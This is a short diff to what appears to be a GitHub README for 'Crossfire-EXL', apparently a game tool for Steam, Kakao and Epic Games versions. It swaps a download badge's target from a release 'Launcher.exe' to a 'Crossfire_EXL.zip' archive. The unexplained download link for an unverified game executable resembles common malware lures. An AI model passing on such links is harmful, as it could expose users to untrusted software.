@@ -1,5 +1,5 @@
 # Download
-[<img src="https://img.shields.io/badge/CLICK_TO-DOWNLOAD-blue?style=for-the-badge">](https://github.com/sebastiajkm/Crossfire-EXL/releases/download/crossfire/Launcher.exe)
+[<img src="https://img.shields.io/badge/CLICK_TO-DOWNLOAD-blue?style=for-the-badge">](https://github.com/sebastiajkm/Crossfire-EXL/releases/download/crossfire/Crossfire_EXL.zip)
 
 # Information
 * Game version: Steam / Kakao / Epic Games
